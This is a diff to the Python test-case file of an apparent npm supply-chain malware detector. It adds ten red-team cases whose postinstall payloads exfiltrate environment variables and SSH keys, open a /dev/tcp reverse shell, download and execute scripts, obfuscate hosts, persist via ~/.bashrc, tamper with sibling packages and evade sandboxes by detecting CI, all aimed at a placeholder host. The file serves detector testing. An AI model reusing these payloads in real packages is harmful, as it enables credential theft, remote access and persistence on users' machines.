@@ -38,7 +38,7 @@ class Dependency:
 @dataclass(frozen=True)
 class Case:
     id: str
-    kind: Literal["benign", "malicious", "incident"]
+    kind: Literal["benign", "malicious", "incident", "redteam"]
     title: str
     body: str
     packages: tuple[str, ...] = ()  # benign: npm install <packages>
@@ -524,4 +524,87 @@ INCIDENTS = [
     ),
 ]  # fmt: skip
 
-CASES = {c.id: c for c in BENIGN + MALICIOUS + INCIDENTS}
+# --- red-team set (HARDENING_PLAN P1.3, gap-targeting) ---
+# Author-designed, aimed at the detector's known blind spots rather than at rules it already
+# passes: rt06-rt08 and rt10 are expected to score Clean, which is the point — an honest
+# red-team row names what we miss. Same safety envelope as the rest: TEST-NET-3, example.com,
+# .invalid names, and file writes only inside the sandbox's ephemeral tmpfs.
+# NOTE: this is NOT a held-out set (the author knows the rules). For a truly independent row,
+# run eval/REDTEAM_PROMPT.md through a model that has not seen this repo.
+
+REDTEAM = [
+    # likely-caught controls
+    Case("rt01-env-https", "redteam", "Add analytics", "Opt-in usage stats.",
+         files=_node_payload("rt01", f"""
+const https = require("https");
+const r = https.request({{ host: "{C2}", method: "POST", path: "/e", timeout: 3000 }});
+r.on("error", () => {{}}); r.on("timeout", () => r.destroy()); r.end(JSON.stringify(process.env));
+"""), note="control: env exfil over HTTPS to a raw IP"),
+    Case("rt02-ssh-key", "redteam", "Add deploy helper", "Helps with deploys.",
+         files=_node_payload("rt02", f"""
+const fs = require("fs"), os = require("os"), http = require("http");
+let k = ""; try {{ k = fs.readFileSync(os.homedir() + "/.ssh/id_ed25519", "utf8"); }} catch {{}}
+const r = http.request({{ host: "{C2}", method: "POST", path: "/k", timeout: 3000 }});
+r.on("error", () => {{}}); r.on("timeout", () => r.destroy()); r.end(k);
+"""), note="control: reads the bait SSH key and exfiltrates it"),
+    Case("rt03-revshell", "redteam", "Add shell helper", "Shell helper for CI.",
+         files={"package.json": _pkg("rt03", {
+             "postinstall": f"timeout 3 bash -c 'bash -i >& /dev/tcp/{C2}/4444 0>&1' || true"})},
+         note="control: /dev/tcp reverse shell"),
+    Case("rt04-fetch-exec", "redteam", "Add bootstrap", "Bootstraps config.",
+         files={"package.json": _pkg("rt04", {
+             "postinstall": f"wget -q -T 3 -O- http://{C2}/s.sh | sh || true"})},
+         note="control: download-and-execute"),
+    Case("rt05-charcode", "redteam", "Tidy config", "Config cleanup.",
+         files=_node_payload("rt05", """
+const h = [50,48,51,46,48,46,49,49,51,46,49,48].map(c => String.fromCharCode(c)).join("");
+const r = require("ht"+"tp").request({ host: h, path: "/x", timeout: 3000 });
+r.on("error", () => {}); r.on("timeout", () => r.destroy()); r.end();
+"""), note="control: char-code obfuscated raw IP"),
+    # gap-targeting: expected to slip past the current rules
+    Case("rt06-persist-rcfile", "redteam", "Add shell completions",
+         "Installs shell tab-completions.",
+         files=_node_payload("rt06", f"""
+const fs = require("fs"), os = require("os"), path = require("path");
+const line = '\\ncurl -s http://{C2}/beacon >/dev/null 2>&1 &\\n';
+try {{ fs.appendFileSync(path.join(os.homedir(), ".bashrc"), line); }} catch {{}}
+console.log("completions installed");
+"""), note="GAP: writes a persistence line to ~/.bashrc; no network at install"),
+    Case("rt07-self-propagate", "redteam", "Add plugin loader", "Loads sibling plugins.",
+         files=_node_payload("rt07", """
+const fs = require("fs"), path = require("path");
+// Overwrite a sibling package's entry point (worm-style), no network at install.
+const nm = path.resolve(process.cwd(), "..", "..");
+try {
+  for (const d of fs.readdirSync(nm)) {
+    const idx = path.join(nm, d, "index.js");
+    if (fs.existsSync(idx)) { fs.appendFileSync(idx, "\\n// injected\\n"); break; }
+  }
+} catch {}
+"""), note="GAP: modifies a sibling node_modules package; no network at install"),
+    Case("rt08-local-miner", "redteam", "Add benchmark", "Runs a quick benchmark on install.",
+         files=_node_payload("rt08", """
+const end = Date.now() + 8000;
+let x = 0;
+while (Date.now() < end) { x += Math.sqrt(x + 1) % 7; }  // CPU burn, no network, no files
+"""), note="GAP: local CPU miner, no egress and no dropped binary"),
+    Case("rt09-dropped-binary", "redteam", "Add native helper", "Sets up a native helper.",
+         files=_node_payload("rt09", f"""
+const fs = require("fs"), os = require("os"), path = require("path");
+const {{ spawn }} = require("child_process");
+const p = path.join(os.tmpdir(), "stage.sh");
+fs.writeFileSync(p, 'exec 3<>/dev/tcp/{C2}/9000\\n', {{ mode: 0o755 }});
+try {{ spawn("sh", [p], {{ detached: true, stdio: "ignore" }}).unref(); }} catch {{}}
+"""), note="writes a stage to /tmp, chmods +x and runs it (expect EXEC_DROPPED_BINARY)"),
+    Case("rt10-ci-dormant", "redteam", "Add telemetry", "Sends telemetry outside CI only.",
+         files=_node_payload("rt10", f"""
+// Real droppers stay dormant where they might be watched. Our sandbox sets CI=true, so this
+// takes the dormant branch and does nothing observable — a demonstrated evasion.
+if (!process.env.CI && !process.env.GITHUB_ACTIONS) {{
+  const s = require("net").connect(4444, "{C2}");
+  s.setTimeout(3000, () => s.destroy()); s.on("error", () => {{}});
+}}
+"""), note="GAP: sandbox-aware; dormant when CI is detected"),
+]  # fmt: skip
+
+CASES = {c.id: c for c in BENIGN + MALICIOUS + INCIDENTS + REDTEAM}
